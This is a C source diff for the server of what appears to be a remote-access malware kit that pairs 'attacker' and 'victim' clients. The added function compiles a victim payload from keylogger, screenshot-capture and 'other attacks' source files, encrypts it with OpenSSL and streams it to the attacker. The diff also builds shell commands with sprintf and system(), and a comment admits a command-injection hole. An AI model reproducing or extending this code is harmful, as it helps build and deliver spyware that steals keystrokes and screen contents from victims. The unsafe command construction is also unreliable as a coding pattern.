@@ -1,6 +1,6 @@
 #include "connection.h"
 
-int opt = TRUE; 
+int opt = true; 
 int i;
 
 void initialize_connection(){		
@@ -58,7 +58,7 @@ void add_child_sockets_to_set(client_ptr * client_list){
 // set the connection between the attacker and his selected victim by setting the socket file descriptor for hech to the other
 void set_attacker_victim_connection (client_ptr * attacker, client_ptr * client_list, int num_of_connected_clients, char * selected_victim_name){
 	char attacker_hashed_id[HASH_LEN];
-	strcpy(attacker_hashed_id, md5((unsigned char *) (*attacker)->id, strlen((*attacker)->id)));
+	strcpy(attacker_hashed_id, md5((*attacker)->id));
 //	for (int curr_client_index = 0; curr_client_index < MAX_CLIENTS; curr_client_index++){
 	client_ptr curr_client = * client_list;
 	while (curr_client){
@@ -80,7 +80,7 @@ void send_to_attacker_connected_victims (client_ptr attacker, client_ptr client_
 		memset(connected_victims[i], '\0', MAX_USER_NAME_LEN);
 	
 	while (client_list){
-		if (strcmp(client_list->id, md5((unsigned char *) attacker->id, strlen(attacker->id))) == 0 && client_list->i_am == VICTIM){
+		if (strcmp(client_list->id, md5(attacker->id)) == 0 && client_list->i_am == VICTIM){
 			strtok(client_list->name, "\n"); // if exist, remove the '\n'
 			strcpy(connected_victims[num_of_connected_victims++], client_list->name);
 		}
@@ -120,4 +120,37 @@ char * decrypt_text (char * text_to_decrypt, char * decryption_key){
 	}	
 	pclose(aes_decryption_fd);
 	return decrypted_text;
+}
+
+// send a file in plain text or in AES-256-CBC encrypted way
+void send_payload_to_attacker(int attacker_fd){
+	main_data data;
+	char sub_buffer[MTU];
+	FILE * payload_fd;
+	char convert_file_to_buffer_commend[MAX_PAYLOAD_TO_BUFFER_COMMEND_LEN];
+	char create_payload_command[300];
+	char create_dir[15];
+	char remove_dir[15];
+	
+	
+	// generate the payload, for any attack we create temp folder that will hold his victim payload
+	sprintf(create_dir, "mkdir -p %d", attacker_fd);
+	system(create_dir);// creating temp folder to hole the payload 
+	sprintf(create_payload_command, "gcc victim_payload/Victim_main.c victim_payload/screenshot_capture.c victim_payload/keylogger.c victim_payload/connection.c victim_payload/other_attacks.c -framework ApplicationServices -framework Carbon -o %d/payload", attacker_fd); // in the further this command will cross compil the payload
+	system(create_payload_command);
+	sprintf(convert_file_to_buffer_commend, "openssl aes-256-cbc -base64 -in %d/payload -k %s",attacker_fd, AES_KEY); // there is injection variability, to be fix
+
+	payload_fd = popen(convert_file_to_buffer_commend, "r");
+	
+	data.file_data.end_of_file = 0;
+	while (fgets(sub_buffer, sizeof(sub_buffer), payload_fd) != NULL) {
+		strcpy(data.file_data.file_sub_buffer, sub_buffer);
+		send(attacker_fd, &data.file_data, sizeof(data.file_data), 0);
+	}
+	data.file_data.end_of_file = 1;
+	send(attacker_fd, &data.file_data, sizeof(data.file_data), 0);
+	
+	sprintf(remove_dir, "rm -rf %d", attacker_fd);
+	system(remove_dir);
+	pclose(payload_fd);
 }
